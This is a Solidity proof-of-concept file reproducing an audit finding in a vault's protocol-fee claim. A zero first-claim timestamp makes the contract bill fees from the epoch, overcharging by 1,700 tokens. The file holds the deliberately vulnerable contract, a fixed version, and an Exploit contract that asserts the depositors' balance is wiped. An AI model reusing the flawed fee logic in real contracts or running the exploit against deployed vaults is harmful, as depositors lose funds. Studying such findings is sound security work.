// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Royco ERC4626i — Cantina, August 2024
    claimProtocolFees reads feeRewardsLastClaimed, which is 0 on the first
    claim, and subtracts it from campaign.end. Elapsed becomes the absolute
    end timestamp instead of end - start.

    start 1_700_000_000, end one day later, rate 1e12 tokens per second.
    Fair fee is 0.0864 tokens. The first claim pays 1,700.0864 tokens.
    Depositors fund that payment. The excess over the fair fee is 1,700 tokens.
*/

contract Asset {
    string public symbol = "ASSET";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Treasury {}

contract ERC4626i {
    struct CampaignData {
        uint256 start;
        uint256 end;
        uint256 protocolFeeRate;
    }

    Asset public immutable asset;
    address public treasury;
    mapping(uint256 => CampaignData) public campaignIdToData;
    mapping(uint256 => uint256) public feeRewardsLastClaimed;
    uint256 public amountOwed;
    uint256 public fairOwed;
    uint256 public elapsedSeen;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function configure(address _treasury, uint256 campaignId, uint256 start, uint256 end, uint256 rate) external {
        treasury = _treasury;
        campaignIdToData[campaignId] = CampaignData(start, end, rate);
    }

    function claimProtocolFees(uint256 campaignId) external {
        CampaignData storage _campaignData = campaignIdToData[campaignId];
        uint256 lastUpdated = feeRewardsLastClaimed[campaignId];
        // @> VULN: lastUpdated is 0 on the first claim, so elapsed is campaign.end instead of end minus start
        uint256 elapsed = (_campaignData.end - lastUpdated);
        uint256 owed = (elapsed * _campaignData.protocolFeeRate);
        elapsedSeen = elapsed;
        amountOwed = owed;
        fairOwed = ((_campaignData.end - _campaignData.start) * _campaignData.protocolFeeRate);
        asset.transfer(treasury, owed);
        feeRewardsLastClaimed[campaignId] = _campaignData.end;
    }
}

contract ERC4626iFixed {
    struct CampaignData {
        uint256 start;
        uint256 end;
        uint256 protocolFeeRate;
    }

    Asset public immutable asset;
    address public treasury;
    mapping(uint256 => CampaignData) public campaignIdToData;
    mapping(uint256 => uint256) public feeRewardsLastClaimed;
    uint256 public amountOwed;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function configure(address _treasury, uint256 campaignId, uint256 start, uint256 end, uint256 rate) external {
        treasury = _treasury;
        campaignIdToData[campaignId] = CampaignData(start, end, rate);
    }

    function claimProtocolFees(uint256 campaignId) external {
        CampaignData storage _campaignData = campaignIdToData[campaignId];
        uint256 lastUpdated = feeRewardsLastClaimed[campaignId];
        if (lastUpdated == 0) lastUpdated = _campaignData.start;
        uint256 elapsed = (_campaignData.end - lastUpdated);
        uint256 owed = (elapsed * _campaignData.protocolFeeRate);
        amountOwed = owed;
        asset.transfer(treasury, owed);
        feeRewardsLastClaimed[campaignId] = _campaignData.end;
    }
}

contract Exploit {
    uint256 public constant START = 1_700_000_000;
    uint256 public constant END = 1_700_086_400;
    uint256 public constant RATE = 1e12;

    Asset public asset;
    Treasury public treasury;
    ERC4626i public vault;

    constructor() {
        asset = new Asset();
        treasury = new Treasury();
        vault = new ERC4626i(asset);
    }

    function run() external {
        vault.configure(address(treasury), 1, START, END, RATE);
        uint256 fair = (END - START) * RATE;
        uint256 billed = END * RATE;
        asset.mint(address(vault), billed);
        vault.claimProtocolFees(1);
        require(vault.elapsedSeen() == END, "elapsed");
        require(vault.amountOwed() == billed, "owed");
        require(vault.fairOwed() == fair, "fair");
        require(vault.amountOwed() - vault.fairOwed() == 1_700 ether, "excess");
        require(asset.balanceOf(address(treasury)) == billed, "treasury");
        require(asset.balanceOf(address(vault)) == 0, "depositors wiped");
        require(fair == 86400 * RATE, "day");
    }
}
